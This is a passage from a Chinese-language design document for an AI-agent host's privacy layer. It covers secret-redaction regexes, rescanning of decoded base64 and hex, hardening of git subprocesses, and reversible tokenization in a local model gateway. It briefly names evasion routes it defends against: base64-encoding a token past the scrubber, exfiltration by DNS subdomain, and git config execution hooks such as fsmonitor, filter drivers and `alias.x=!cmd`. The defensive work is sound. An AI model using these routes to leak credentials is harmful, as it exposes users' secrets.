`E2E-SCHEDULED-PROMPT`)能通过「三类多样性 + 含数字」守卫,会被用户输入 guard 当 secret 脱敏 —— privacy-first 刻意接受;e2e fixture(`tests/e2e/schedules.spec.ts`)已因该形态调整。
- **AWS_KEY_RE 对齐(P3)**:双侧统一 —— key 名后引号容忍(`"aws_secret_access_key": "…"` JSON 形态)+ 裸 `AKIA[0-9A-Z]{16}` 分支 + value 前后引号容忍。裸 40 位 secret access key(无前缀、含 `/`)刻意不做上下文无关匹配(误杀面大),兜底靠 key 名锚定(本条 + env-var-secret + `scrub_env_value`)。
- **Bearer 放宽(P4)**:Rust 原要求 token 含 1–2 个 `.`(只认 JWT 形态),不透明 bearer token(OAuth 网关 token 等)漏;双侧统一为无点要求 + body 最小 8 字符(「Bearer bonds」类自然语言不误吞)。2026-10-09 round-2 补:TS 侧大小写口径对齐 Rust 的 `(?i)`(`BEARER` / `AUTHORIZATION` 任意大小写都命中;`eyJ` JWT 分支保持大小写敏感)。
- **env 快照 scrub 带 KEY 名(P5)**:boot 环境快照此前逐 VALUE scrub,名字锚定的 pattern(AWS_KEY_RE / env-var-secret)不可达,`AWS_SECRET_ACCESS_KEY` 的 40 位值会原样注入子进程 env。新公共 helper `kaya_core::llm::scrub::scrub_env_value(key, value)`(桌面 + CLI 共用):对 `key=value` 整体 Strict scrub 后剥前缀拿回 value;key 名也在 redaction span 里时整个 placeholder 当 value(fail-closed)。
- **URL 凭据口径统一(P6)**:PASSWORD_IN_URL_RE 协议清单补 `ftp|ssh|git|clickhouse|nats|kafka|ldap`;TS 的 url-credentials 从仅 http(s) 放宽到 Rust 的任意 scheme `user:pass@` 口径(两侧左起匹配语义逐字一致,registry 顺序同步对齐防类别漂移)。
- **API_KEY_RE key 名后引号(P3-余)**:`{"api_key": "…"}` 形态 key 与冒号之间的 `"` 此前使正则失配(非 `sk-` 前缀的短值会漏),双侧补 `['"]?`。
- **watcher excerpt / 状态摘要恒 Strict(P7)**:interaction watcher 的全部出口与远程链路(interaction_answer / agent_status)此前取用户 scrub 档位 —— 被动采集的屏幕内容不应随用户档位降级;现与 `llm_decide` 画面摘要同口径恒 `Strict`。
- **list_dir 输出过 scrub(F2)**:目录列举的文件名此前不过 scrub(`backup-sk-….txt` 这类文件名会把 secret 形态带进上下文);现输出统一过共享 scrub 档位(与 run_shell / terminal_read 同一档,Tier-0 恒生效),metadata 带 `hadRedactions`,普通文件名不受影响。

### 7.9 encoded-secret 解码重扫层(2026-10-08,单层 base64/hex)

**动机**:§12 此前自认「base64 编码过的 secret 拦不住」—— scrub 是正则,`echo "$TOKEN" | base64` 形态的载荷不进任何 Tier-0 模式;entropy fallback 的字符类又刻意不含 `/`(macOS 路径误伤先例,§7.1),含 `/` 的标准 base64 串连 entropy 都兜不住。绕过 scrub 进上下文的内容还可经 DNS 子域编码外发(见 §5.1 的 CVE-2025-55284 条目)。gitleaks v8.26+ 已用「decoder:base64/hex 解码后递归重扫」解决同类问题,本节是其**有界**移植。

**语义**:对文本中 base64 / hex 形态的候选 span,解码后用 **Tier-0 具体 secret 模式集**(provider tokens / API_KEY_RE / AWS_KEY_RE / bearer / JWT / PEM BEGIN 标记 / password-in-url / DB URL 等现有静态正则,Rust 侧直接复用 `tier0_core`,两侧模式表天然不漂移)重扫解码结果;**仅当解码结果命中具体模式时**,把原始编码 span 整段替换为 `[REDACTED:encoded-secret]`。解码无命中 → 原文保留(sha256 hex、随机 base64、PEM 公钥 body 一律不动 —— **按构造零误报**)。

**边界与护栏(Rust `scrub.rs::scrub_encoded_secrets` ↔ TS `scrubber.ts` 的 encodedSecretB64 / encodedSecretHex 条目,逐字一致)**:

- base64 候选 `[A-Za-z0-9+/\-_]{24,}={0,2}`,总长度 ≤ 4096;span 含 `-`/`_` 时按 base64url 解码(混含 `+`/`/` 的形态两侧同规则跳过);
- 长度必须是 4 的倍数(canonical padding)才尝试解码 —— Rust engine 默认 RequireCanonical,TS `atob` 对缺 padding 长度反而宽容,不显式卡齐会两侧漂移;
- hex 候选 `[0-9a-fA-F]{40,}`(ASCII `\w` 边界 = JS `\b`),偶数长度、≤ 4096 字符,按字节对解码后 lossy UTF-8(`from_utf8_lossy` ↔ `TextDecoder` 默认 U+FFFD replacement,同义);
- **深度 1**:解码结果只过 Tier-0 模式集(不含本层、不含 entropy),不再二次解码 —— 多层嵌套编码仍是已知边界(§12);
- 跳过 PEM 块内候选与两侧恰是 `[REDACTED:...]` placeholder 边界的候选(复用 entropy 的守卫做法);
- 只对候选 span 解码,不做全文本解码尝试,性能有界(scrub 跑在每个 ≤100KB 的工具输出上);
- **已知差异(2026-10-09 review)**:Rust `general_purpose` engine 对 non-canonical base64 trailing bits 拒绝解码(原文保留),TS `atob` 不校验 —— 对抗性构造的 non-canonical span 可能 TS 侧解码(并 redact)而 Rust 侧不动。仅蓄意构造的输入可触发;canonical 编码器的输出必然 canonical,不会命中该差异。

**调用位置(parity 硬约束)**:Tier 派发之后、high-entropy fallback **之前**(具体 pattern 先赢类别的既有哲学;entropy 能抓的多数 span 会被它先抓,本层补的是 entropy 字符类/多样性守卫漏掉的)。所有档(Minimal/Balanced/Strict)都跑 —— 它是 Tier-0 语义。测试:Rust 9 个 fixture(`encoded_secret_*`)与 TS 镜像逐一对齐 —— 含 `/` 的标准 base64、base64url、hex GitHub PAT 命中;裸 sha256 / 随机 base64 / PEM 公钥 body 不动;双重编码不递归;>4096 span 跳过;placeholder 相邻/重叠不错吞。

### 7.10 任务队列感知:git 摘要采集与 evidence 字段(2026-10-10)

- **git 摘要是 kaya 自采,不是 LLM 发起**:perceive / report 回合前由
  Rust `task_repo_digest` 命令以 `std::process` 直起 git 只读子命令
  (`rev-parse` / `symbolic-ref` / `status --short` / `diff --stat HEAD` /
  `log --oneline -8`),**不经过 run_shell / policy gate**;不带 stdin,
  `--no-optional-locks` 禁 index 写入。已关闭全部已知 repo 可控执行面
  (2026-10-10 round 6/7 实测):`-c core.pager=cat` 禁 pager、
  `-c core.fsmonitor=false` 禁 fsmonitor 钩子、`-c log.showSignature=false`
  禁签名验签(repo 的 `gpg.program`)、属性过滤(`filter.<driver>.clean`)
  在 git≥2.40 经 `GIT_ATTR_SOURCE`=空 tree 完全关闭 —— 旧版 git 残留
  理论面:repo 提交的 `.gitattributes` 指向的 filter driver 在 re-hash
  时执行(利用前提是本地 `.git/config` 已被写入 driver 命令,与恶意
  仓库本身已能代码执行的前提同阶)。另剥离进程环境的 11 个 GIT_* 变量
  `GIT_DIR` /
  `GIT_WORK_TREE` / `GIT_COMMON_DIR` / `GIT_INDEX_FILE` /
  `GIT_OBJECT_DIRECTORY` / `GIT_ALTERNATE_OBJECT_DIRECTORIES` /
  `GIT_CONFIG_COUNT` / `GIT_CONFIG_PARAMETERS` / `GIT_CONFIG_GLOBAL` /
  `GIT_CONFIG_SYSTEM` / `GIT_EXEC_PATH`(防重定向仓库 / 注入 config /
  重定向子命令解析路径);5s 超时 +
  kill_on_drop。**LLM 的 run_shell 不放开 git**(执行面含
  `-c alias.x=!cmd` / `--exec-path` 等,子命令白名单是独立的 v2 工作)。
- 拼接输出先截断 4KB(char boundary 回退)、过 **Strict output scrub**、
  scrub 后再复查一次 4KB 截断(占位符替换可膨胀反弹超限,2026-10-10
  round 5)才进 prompt;cwd 取 OSC 7 跟踪值(与 terminal_read 同源)。
  审计只记「采集了哪个 pane、产出字节数」(app_log tag `repo_digest`),
  不记内容。
- `task_queue report` 新增可选 `evidence` 字段(≤500 字符,前端
  fail-closed 校验):内容是 LLM 对已过 scrub 证据的**引用摘要**
  (如「git log 新增 2 个 commit」),不携带证据本体;随 done/failed
  条目持久化在 localStorage persist(与其他任务字段同级,不进
  ~/.kaya 审计流)。
- report 汇报回合的 agent 自报(terminal_write)仍走既有授权卡
  (controlGrants),授权面不变;coding 关闭时退化只读汇总。

### 7.11 网关可逆令牌化(2026-10-13,模型网关 Phase 1)

**定位:与 5 道关卡并行的第二条隐私管线**。5 道关卡管的是 kaya Chat
自己的 LLM 流量;被驾驶的编程 agent(claude-code / kimi-code /
opencode / codex)此前**直连 provider**——整个仓库的文件内容、diff、
终端输出直发模型,kaya 没有任何检查能力(结构性缺口:不在流量路径上
就永远不可能检查)。模型网关把脱敏层放到流量路径上:接入后(2026-10-14
起收敛以 per-agent 开关为前提,见本节末「接入与退出」)agent 的配置被
收敛为网关形态(base_url 恒指 `http://127.0.0.1:<port>`,
写配置仍走既有 apply_config/sync 机制),agent 的全部 API 请求经本机
回环网关转发,出站前过**可逆令牌化**管线。它不是「第 6 关」
(policy/safety/execute 隔离的概念不适用于纯转发),检测规则与 Chat
scrub 同源(kaya-core `scrub.rs` 的 `gateway_rules()` 导出,规则演进
遵守既有「Rust 表 + TS 镜像同 PR」纪律)。**kaya Chat 自身流量
(BYOK / 内置模型)不进网关**(spec §15.1 钉死:内置走 yunhou `/chat`
+ JWT 不变,Chat BYOK 直连不变,两条链路的 scrub 语义本就不同)。
设计全文:`docs/superpowers/specs/2026-10-13-model-gateway-design.md`。

**管线三段**(spec §3/§5/§6):

1. **出站**:before_request hook 对请求体文本字段(messages content /
   tool 描述等,按协议 schema 逐字段)跑检测规则,命中内容替换为
   **形状保持令牌**(`sk-…` 形态只换字符段、邮箱保留域名结构、手机号
   保留位数与前缀段、JWT 保持可解码性;2026-10-22 起身份证号 / 银行
   卡号也从 opaque 的 `kaytok_…` 改为形状保持——身份证号令牌是等长
   数字串且 GB11643 校验位合法,银行卡令牌保留分隔符位置且 Luhn 校
   验合法,模型看到的是一个「正常的身份证号 / 银行卡号」,无从分辨
   被动过手脚);同一 hook 把 `kaya/<slug>`
   model 别名(slug 定格不可变;2026-10-16 供应商分层起 slug 是
   **模型级**(由模型 id 派生),缺失时回退 `kaya/<legacy_entry_id>` →
   `kaya/<provider_id>` 两档 legacy 形态,网关双查永久可解析,路由
   同构)重写回真实 model、把占位 token 换成真实 key(见下)。
2. **映射**:令牌 = f(HMAC(secret, 本机随机密钥), 目标形状)——
   **内容寻址**:同一内容跨请求 / 跨会话 / 跨 app 重启恒得同一令牌。
   理由:prompt 前缀缓存只在首次改写时 miss 一次之后永久稳定(随机
   令牌会让缓存全灭);同一实体(如小说人物「张伟」)在所有会话映射
   到同一假名,模型看到的文本前后一致。本机密钥
   `~/.kaya/gateway/token.key`(0o600,首启随机生成;轮换 = 全量令牌
   失效、缓存集体 miss 一次)。
3. **入站**:after_response hook 按 JSON/SSE 载体做令牌 → 真值还原。
   JSON 字符串先解码;Chat `function.arguments`、Responses `arguments`
   与 Anthropic `partial_json` 的内层 JSON 独立转义,随后再编码外层响应,
   保持引号、反斜杠与换行的真实语义。SSE 参数按 response/call/index
   隔离 hold-back 滑窗,令牌跨网络 chunk 或参数 delta 事件拆分仍可恢复;
   Responses custom tool 的 input/delta 使用独立的自由文本滑窗,不套用
   function arguments 的内层 JSON 编码。
   agent 收到的工具参数(write_file 内容等)与助手文本都是真实值。
   **模型全程只见令牌**;
   网关日志 / 审计只见令牌与计数。

**关键性质与不变量**:

- **只有语义保持的改写才可自动执行**:响应还原只能恢复 agent 侧文本,
  不能撤回上游模型已经受到的语义影响,因此不能把误报当作「无害自愈」。
  出站动作按**字段上下文 × 命中置信度 × 档位**裁决:技术字段里的
  PatternPii / Heuristic 只观察不改写,具名 secret 仍令牌化;还原是兼容
  兜底,不是放宽检测的理由。Chat 链路的不可逆 `[REDACTED:category]`
  语义保留不动:两种场景(一次性外发 vs 持续往返)各有最优解。
- **令牌单行 alphabet `[A-Za-z0-9._@-]`**(spec §16-E4):多行令牌无法
  穿透 JSON 字符串的 `\n` 转义被逐字节还原;PEM 令牌保留 BEGIN/END
  标记但 body 单行化。标量恢复仍用字节滑窗,JSON/SSE 外壳只负责区分
  文本、工具参数和不透明 ID / name / signature / encrypted_content;
  不透明字段不作真值替换。SSE 的 event、id、retry 与注释逐字保留。
- **响应协议语境**:角色、结束原因、状态等结构枚举按 Chat choice/message、
  Anthropic message/block/delta、Responses response/item/event 等对象位置
  保留。工具业务载荷里的同名 role/status/type/signature 等仍正常恢复,
  不以字段名全局豁免。Anthropic thinking 的正文与签名(含 start/delta)、
  redacted_thinking.data 保持原值,保证工具往返的完整块未改;opaque 只适用
  已知载体中的字符串/null,异常对象与额外字段仍扫描恢复。
- **Schema 与 compaction**:Responses 的 `text.format(type=json_schema).schema`
  与 function 工具定义的 `parameters` 使用专门 Schema 语境,递归区分属性/
  定义/组合/数组子 Schema。类型(含类型数组)、required 属性名、结构引用/
  标识与格式/模式约束保持一致;enum、const、default、examples、description
  等业务值仍恢复。任意工具业务数据里的同名 schema/type/required 不因此豁免。
  原生 Responses 的 compaction item 在出入站均保留 encrypted_content、id
  与 created_by 的字符串/null,异常对象、额外字段与业务同名字段继续扫描。
  这只覆盖既有原生 `/responses/compact` → `/responses` 往返,不扩展 ChatGPT
  精确路径闸或任何适配器白名单。
- **SSE 恢复状态有界**:单个未完成事件最多 1 MiB;待决事件载荷与参数
  滑窗合计最多 1 MiB、最多 1024 个待决事件、256 条活跃参数流。参数
  闭合或对应调用结束即释放,不等待整条响应。真值展开同样受输出预算
  约束;越界丢弃未发出的待决部分,发送既有协议错误终帧并记上游失败,
  不伪造 completed。失败/截断保留原终局语义,不补齐参数或成功事件。
- **vault 内存态**(D3 拍板):token → 真值 的还原索引只在网关进程
  内存。活跃池上限 4096 条,FIFO 淘汰的映射进入同容量(4096 条)恢复
  历史,仍参与既有占位符保护与响应还原;两级均满时以
  `kaya_gateway_vault_full` fail-closed 拒绝新增,不静默丢映射。
  **不落盘、不进 debug dump**(落盘 = 一张
  敏感映射表,与隐私定位冲突)。内容寻址使 vault 只是还原索引而非
  唯一真相:重启清空后,同一 secret 下次出站会重新令牌化为同一令牌
  并重建映射;只有「重启后模型引用重启前会话里的令牌、且该真值不再
  出现于任何出站请求」的边角还原不了,此时令牌原样透传给 agent
  (形状合法,不炸)。
- **用户令牌表落盘**(spec §14.4):用户手动维护的「真值 → 指定令牌」
  映射(小说人物替身表场景,优先级高于自动检测)存
  `~/.kaya/gateway/token-map.json`(0o600 原子写,Settings 网关区块
  编辑,读写走 Tauri 命令不碰 localStorage)。与 D3 的自洽:vault 是
  **自动产物**(可经内容寻址重建,落盘徒增敏感面);用户令牌表是
  **用户主动创建的数据**(等同把文件放进 trusted root 的既有先例),
  不同性质不同处理。不进 debug dump,审计只记条数。
- **失败动作按类别分档**(spec §6.6/§14.6;下列是**散文 / 未知字段**的默认动作,
  技术字段按本节的协议字段动作矩阵收敛):secret(PEM 块、厂商固定
  前缀 key、JWT)与结构化 PII(邮箱 / 手机号 / 身份证 / 银行卡,银行卡
  带 Luhn 校验降误报)默认令牌化;**高熵兜底** Balanced 档默认只标记
  不改写(warn:响应头 `x-kaya-scrub: tokenized=0; warned=N` + app_log + 计数),
  Strict 档升为令牌化;Minimal 档只令牌化 secret 类。**网关档位是独立
  设置(2026-10-22 解耦,此前跟随 Chat 全局 ScrubLevel 做只读镜像):
  2026-11-02 起默认 Minimal(前端档位名 `strict`),只自动令牌化具名
  secret,PII 不自动改写**(避免拟真替身与协议字段误拦;Balanced /
  aggressive 仍可显式选择)。Settings「网关」面板 select 直改;用户输入
  guard 固定 aggressive,工具输出默认 aggressive、可在「通用」调整,
  两者均独立于网关档。解耦迁移:旧 config 的档位值一律是 boot 推档
  artifact(从未可编辑),首个新版 init 一次性改写为当前默认档并置
  `scrub_level_decoupled` 标志;**已解耦的存量用户档位不被默认变更覆盖**。
  档位持久化在 `~/.kaya/gateway/config.json`。高熵兜底仍保留一条既有豁免(2026-10-14 复审
  收口,如实声明):>4KB 的超长字符串整段跳过(不 redact 不 warn,性能放大器
  同案收口)。**2026-10-26 起二进制载荷改走精确媒体校验**(spec §8,实现
  `gateway/pipeline/media.rs`),旧的「JSON key 落在 `data`/`url`/`image`/
  `image_url`/`file`/`file_data` 且值像 base64 即豁免」**通用承载键启发式已
  删除**:普通 `data` 字段不再享有任何特权,「任意文本 base64 化后借 carrier
  键绕过具名 secret 检测」的通道随之关闭。媒体豁免必须**同时**满足:① 路径
  是当前协议的**精确**图片 / 文档 / 音频 carrier(Anthropic `source.data` 且
  `source.type:"base64"`、Chat `image_url.url` / `input_audio.data`、Responses
  `input_image.image_url` / `input_file.file_data` / `input_audio.audio_data`,
  含 Responses 工具输出 `output[]` 中的同类部件)。豁免仅传给字符串叶:
  Chat 分别只认 `image_url.url` / `input_audio.data` / `file.file_data`;
  Responses 另兼容一层对象中的图片 `url|data`、文件 `file_data|data`、
  音频 `audio_data|data`。叶键下的对象/数组和额外键按 Unknown 扫描,
  不递归继承媒体豁免;② 声明互相一致(data URL
  的 MIME 前缀 × 兄弟 `media_type` / 音频 `format`(wav→audio/wav、
  mp3→audio/mpeg),声明值 trim + 小写;RFC 2397 的 scheme 与 `;base64,`
  标记大小写不敏感;没有声明即 fail-closed)。`format` 仅精确音频载体
  采集,其它业务 `format` 保持 Unknown,不提供声明也不制造冲突。缺少
  `format` 可由有效 MIME 声明;显式未知非空格式为 Unsupported,显式
  `format` / `media_type` 的 null、对象、数组、非字符串或空白值为 Invalid,
  不能被其它有效声明遮蔽。外层部件与单层载体合并所有声明,异常/已知冲突
  优先 Invalid,再判未知格式 Unsupported;声明错误不受载荷候选的长度/
  字符集筛选影响,部件退出即恢复声明状态。精确音频字符串叶无普通文本/
  远程 URL 语义,无条件进入严格媒体校验;短/空串、URL-safe 字符、换行或
  错误文件头不能退回文本路径。图片/文件仍沿用候选策略,远程图片 URL
  可按文本规则处理;③ base64 只用
  STANDARD / STANDARD_NO_PAD 明确形态(URL-safe `-` / `_`、中段 padding、
  尾位非零一律拒);④ 解码后的文件头与声明一致(PNG / JPEG / GIF / WebP /
  PDF / WAV / MP3;WAV 要求 RIFF/WAVE,MP3 要求**结构完整的 ID3v2 标签**
  (10 字节头、主版本 2/3/4、保留标志位为 0、synchsafe 大小;v2.4 footer 标志
  置位时另计 10 字节 footer,必须完整;标签之后若还有
  内容必须是合法 MPEG audio frame header)或合法 MPEG audio frame header);
  ⑤ 解码与扫描有界(复用请求体上限)。满足即 **Preserve**:载荷逐字节
  不变,具名 secret / PII / 高熵规则都**不得扫 base64**。`text/*` 文本载体有界
  解码为 UTF-8 后按**散文语境**过动作矩阵:有改写时按原 engine 与原 data URL
  前缀重建(载体仍合法),无命中时保留原始 base64 逐字节不变。**不支持的类型**
  (其它 audio / video / octet-stream / 空 MIME 等)、**声明冲突**、**验证失败**
  (非法 base64 / magic 不符 / 非 UTF-8 文本载体)一律**结构化 400 拒绝且不转发上游**
  (固定哨兵 `kaya_gateway_invalid_inline_media` /
  `kaya_gateway_unsupported_inline_media`;错误体只有哨兵 + 一句固定英文说明,
  不含载荷原文 / base64 片段 / 解码文本;warn 级 app_log
  `gateway_inline_media_rejected` 只记 agent + 哨兵串)—— 绝不退化成对 base64
  字符流做随机片段替换。**检测盲区如实声明**:文件头验证只能阻止简单文本
  伪装,带有效图片 / PDF / 音频头的任意字节内部仍可能夹带敏感信息(二进制内容
  内部的文字不在文本 regex 覆盖范围内),「已验证文件头」≠ 绝对安全;未被识别为
  精确媒体的二进制载体仍按文本规则扫描。2026-10-24 起
  **仅在网关管线**另豁免公开协议 ID(`call_` / `toolu_` / `tool_` / `fc_` /
  `resp_` / `msg_` 前缀 + 至少 16 位 base64url 主体):这些 ID 是协议关联标识,
  不是凭据,只在高熵兜底命中后跳过(与档位无关:Minimal / Balanced / Strict
  三档一致);Chat scrub 与 TS 镜像不变。豁免**只对
  干净的协议 ID 生效**:`_` 是单词字符,带 `\b` 的具名规则在「协议前缀 +
  内嵌 secret」形态下起止两端都可能失配,因此豁免前先在 id body 上补扫同
  一批具名规则,且补扫覆盖 **body 内所有起止边界形态** —— 原样扫一遍(覆盖
  secret 从 body 起点开始 / `-` 分隔),再以「`_` 视作词边界」的宽松模式扫
  一遍(文本与模式里的 `_` 同时替换成非单词哨兵,等价于把 `_` 当分隔符;覆
  盖 `call_x_gho_…` 与 `call_gho_…_x` 这类前后接 `_` 片段的形态)。具名
  secret / PII 命中优先,`call_sk-…` / `toolu_gho_…` / `resp_sbp_…` 等形态
  一律令牌化。裸 `sk-` 规则的前导边界改用后过滤(前一字节是字母 / 数字才拒
  绝)而非 `\b`,所以 `token_sk-…` 这类「`_` 后跟 key」的边界形态也命中。
  补扫**不设 body 长度 / 候选数上限**(公开 ID 是互不重叠的匹配,body 总长
  ≤ 文本长度,补扫代价与全文本扫描同阶),且豁免以「该 body 确实进入补扫
  集合」为前提 —— 查不到即 fail-closed:既不豁免、也不降级成 Warned 放过,
  而是按可替换的密文 span 处理(2026-10-24 第三轮复审:此前的 256 字节上限
  会让超长 ID 里的具名 secret 在 balanced 档原样上行)。
- **协议字段感知的动作矩阵(2026-10-26,spec §5/§6)**:出站令牌化不再「整段文本一律同档处理」——
  网关按**入站协议**(Anthropic / OpenAI Chat / OpenAI Responses)给每个字符串算出字段
  上下文(散文 / 代码或工具载荷 / 工具结果 / 协议元数据 / 签名思考 / 内联媒体 / 未知),再按
  「内容类型 × 命中置信度 × 档位」裁决动作。命中分四档置信度:**具名 secret**
  (厂商固定前缀 key、JWT、PEM、用户显式令牌表)、**已校验 PII**、**形态 PII**、
  **高熵兜底**。
  - **进入文本扫描的具名 secret 在所有字段类型与所有档位一律令牌化** —— 协议元数据与工具载荷
    **不是**具名 secret 的绕过面;下文精确 opaque 字段与已验证二进制载体不进入文本扫描;
  - **已校验 PII**(18 位身份证通过 GB11643 校验位 **且** 第 7–14 位是合法日历
    日期;银行卡号已过 Luhn 且未落入 epoch-ms / 公开测试卡排除项):**不因出现
    在工具字段而放行** —— 散文里 balanced / strict 令牌化,**工具载荷 / 工具结果
    里同样令牌化**(真实卡号不该因为出现在工具结果里就原样上行);Minimal 档
    一律不改写;
  - **形态 PII**(普通邮箱 / 手机号 / 未通过校验位或日期门的 17–19 位数字串,以及
    被 epoch-ms 排除的 credit-card 候选):散文 / 未知字段里 balanced / strict
    令牌化 —— **散文 Balanced 下的低置信 id-cn 是唯一例外,只观察不改写**
    (`prose_low_confidence_id_cn_observed`:无效形态误伤面大);**工具载荷 /
    工具结果里只观察不改写**(记一条 warn 命中)—— 此前这些字段里的手机号片段
    会被改写,直接破坏函数入参 JSON 与工具结果;需要保护真实 email / phone 时
    用**用户显式令牌表**;
  - **数值精度与公开夹具**(2026-10-26 落地,spec §9):纯 13 位且落在
    2001-01-01 – 2035-12-31(Unix 毫秒)的候选不令牌化,记
    `epoch_ms_excluded`(全档全字段);公开支付测试卡常量与 RFC 保留文档域名
    (`example.com` / `net` / `org`,`.invalid` / `.test` / `.example` 结尾)精确
    命中即 Preserve(`public_fixture_preserved`)—— 清单只含公开常量、不做模糊
    匹配,**用户显式令牌表条目永不豁免**。AWS IAM 官方文档的 access key ID
    示例 `AKIAIOSFODNN7EXAMPLE` 同属精确公开夹具(包括 entropy 规则看到同一
    字符串时);相似 AKIA 形态值与 secret access key 均不豁免;
  - **高熵兜底**:散文 / 未知字段 balanced / minimal 只标记、strict 令牌化;**工具
    载荷 / 工具结果里所有档位只观察**(严格档也不再改写技术字段里的高熵标识符,
    不以破坏协议结构为代价);
  - **协议元数据**(`id` / `type` / `name` / `tool_call_id` 等):PII 与高熵命中
    **一律不改写**(此前 `tool_call_id` 里酷似手机号的片段会被改掉,上游直接
    报错);
  - **工具定义**(Chat `tools[].function.parameters`、Anthropic
    `tools[].input_schema`、Anthropic `server_tool_use.input` 等)属**技术载荷**:
    schema 里的示例值只观察不改写;
  - **内联媒体**(精确图片 / 文档 / 音频 carrier 路径,含 Responses 真实 wire 的
    字符串形态 `input_image.image_url` / `input_file.file_data` /
    `input_audio.audio_data`;`function_call_output.output[]` /
    `custom_tool_call_output.output[]` 中的同类部件也走精确媒体路径,文本部件仍是
    ToolResult):路径、声明、base64 形态与文件头全部通过校验后**载荷逐字节 Preserve**,
    PII / 高熵 / 具名 secret 规则都**不扫 base64**;校验失败按上文精确媒体口径结构化
    400(不退化成改写);
  - **协议完整性字段(2026-11-02)**:Responses `reasoning.id` /
    `reasoning.encrypted_content` / `previous_response_id` / `conversation`、Anthropic
    `thinking.signature` / `redacted_thinking.data` 是**绑定、签名或服务端历史引用的
    不透明数据**,仅字符串标量(及空值)在任何档位都不按文本规则扫描、逐字节上行;
    `conversation` 对象仅字符串 `id` 享有此豁免,额外字段与错误类型的对象 / 数组仍按未知字段扫描。
    `custom_tool_call` / `custom_tool_call_output` /
    `item_reference` 的 `id` / `call_id` / `input` / `output` 按既有
    `function_call` 同义分类。JSON object key 若命中具名 secret,无法在不破坏
    结构的前提下改写,整请求以 `kaya_gateway_protocol_integrity` **400 拒绝
    (零上游)**,不静默放行。
  - **签名思考完整往返(2026-11-04)**:Anthropic `messages[].content[]` 的直接
    内容块,仅当消息 `role` 精确为 `assistant`、块 `type` 为 `thinking`、
    `thinking` 是字符串且 `signature` 是非空白字符串时,正文与签名在
    Minimal/Balanced/Strict 均原样保留。正文完全跳过脱敏,包括具名 secret、
    PII、显式令牌表和已有替身,不新增 vault 映射、恢复引用、隐私命中或明细。
    **网关只识别协议位置与类型、不验证签名或上游来源**;符合形态的正文即使
    含敏感值也原样上行,这是为保留签名历史而明确接受的隐私例外。
    保证解码后的字符串值逐字不变,JSON 仍由既有管线序列化。
    额外字段、错误类型正文、缺失/空白/错误类型签名、其它 role、工具参数、
    嵌套工具结果与其它协议同名对象不获得该正文豁免;不合格签名块的正文若需
    改写仍整请求拒绝并记零内容诊断。JSON key 的完整性检查照常执行。
  - **未知字段**:保持与本节前述档位一致的旧语义(不因新增字段绕过 secret 检测)。
  **Minimal 档在任何字段都不自动改写 PII**(散文 / 工具载荷 / 工具结果都一样)——
  与「只跑 secret 类」的既有口径一致;因此 Minimal 下工具字段的 PII 命中是
  「观察」而不是「令牌化」,统计口径勿与 balanced / strict 混读。
  **网关默认档为 Minimal(前端档位名 `strict`;2026-11-02)**:新安装与未显式
  选择过档位的配置只自动拦截具名 secret,PII 不自动改写;已持久化的用户档位
  不被默认变更覆盖。前端档位名与 Rust 枚举语义相反,未知值仍回落最激进档。
  **响应恢复作用域(2026-11-02)**:只恢复**本请求实际引用或新生成**的 token;
  仅当 Responses 请求携带非空字符串 `previous_response_id`、非空字符串
  `conversation`,或含非空 `id` 的 conversation 对象时,才因服务端历史可能引用
  请求体外的旧 token 而保留完整历史映射;`null`、空字符串、错误类型或空对象不开启。
  请求引用收集与响应恢复共享同一边界:字母数字直接相连,或经 `._@-` 连接到另一侧
  字母数字,视为更长标识符而不恢复;独立句号、Markdown 下划线、独立连字符等句读
  不阻止恢复。流式右侧尚未写出的字节会作为真实上下文参与判断,不把 safe prefix
  末尾伪装成 EOF;JSON / SSE 载体按解码后的 `\n` / `\uXXXX` 等字符判断边界,
  不把原始转义末尾的 `n` 或十六进制字符当作标识符。真值按 JSON 字符串转义写回,
  PEM 等多行真值不会破坏响应帧;HTTP 层已剥离上游 `content-length`,变长恢复
  不会截断响应。
  命中记录额外携带**字段路径(RFC6901 JSON pointer)/ 内容类型 / 置信度 / 决策
  短码**,只进本地隐私明细通道(§8.4);请求事件与日志仍零内容。
- **未知路径默认透传 + 标记**(D8/E1 拍板):端点白名单外的路径默认
  透传 + warn 级 app_log + 审计计数(fail-closed 全拒会打断 agent
  功能——count_tokens 被拒则 auto-compact 失灵);Settings 网关区块的
  独立开关可切 strict 拒绝,**不随 ScrubLevel 联动**。内容承载端点
  (含 `/v1/messages/count_tokens` 等)一律过 hook 管线,元数据端点
  (`/v1/models` 等)直通。
- **占位符与 key 不变量**(spec §7.1/§15.2):网关形态下 agent 配置
  文件里的 api_key 是 per-agent 随机占位 token
  (`kayagw_<agent_id>_<random>`,同时承担路由标识与本机防滥用语义),
  model 是 `kaya/<slug>` 自描述别名(slug 定格不可变;2026-10-16
  供应商分层起为模型级,缺失回退 `kaya/<legacy_entry_id>` →
  `kaya/<provider_id>`;绑定丢失时可经 adoption 重建绑定)。**鉴权头中的占位 token 不得上行**(注入后硬断言);供应商声明的自定义头还拒绝 `kaya/` 别名。Content 请求会把顶层模型别名改写为真实模型;Metadata 直通的正文例外见下方「边界与已知限制」,不能泛化为所有正文都删除别名。真实 key 只存
  keychain 与网关进程内存——**网关启用期间,被绑定条目的 key 驻留
  网关进程内存**(此前 key 只在写配置 / 探测时瞬态读出);2026-10-14
  起(Phase 1.6,全量目录 + 按请求选路)内存快照扩为持有**全量**库
  条目的 key(原为仅绑定条目),驻留副本仍仅内存态、不落盘;请求鉴权时才发送至配置的对应上游。kaya-core
  不碰 keychain 的分层纪律不破:网关核心的条目 / key / 绑定全部来自
  壳层推送的内存快照,不自己读库文件、不读 keychain。入站只绑
  127.0.0.1;对入站 key 只做「是不是占位符」的形态校验,不校验真值
  (真值不出网关)。
- **OAuth 凭据在网关侧的同一组不变量(2026-10-17,Phase 3 Task 6)**:
  OAuth provider 接入的 agent 配置与 api_key 形态**逐字相同**——仍是
  per-agent 占位 token + `kaya/<slug>` 别名,**OAuth access token /
  refresh token 永不落 agent 配置文件**。网关快照里放的是壳层解析后的
  bearer(`resolve_bearer`:keychain token 包 / `AuthRuntime` 内存缓存;
  sync 推送零网络,可 await 的触发点才做临期刷新),路由显式携带认证
  scheme——OAuth 一律 `Authorization: Bearer`(api_key + anthropic 族仍
  是 `x-api-key`)。上游第一次 401 时,网关经壳层 hook 强制刷新并
  **重放一次**(新 bearer 通过占位符 / 别名硬断言后才原子替换路由);
  第二次 401 携带本跳 bearer 复核:**只有它仍是 current 凭据**才清掉
  route bearer 并置 expired 标记(UI 提示重新登录);若另一请求或重登已
  写入新 bearer,迟到的旧 401 不得遮蔽或清除新凭据。路由替换与清理都在
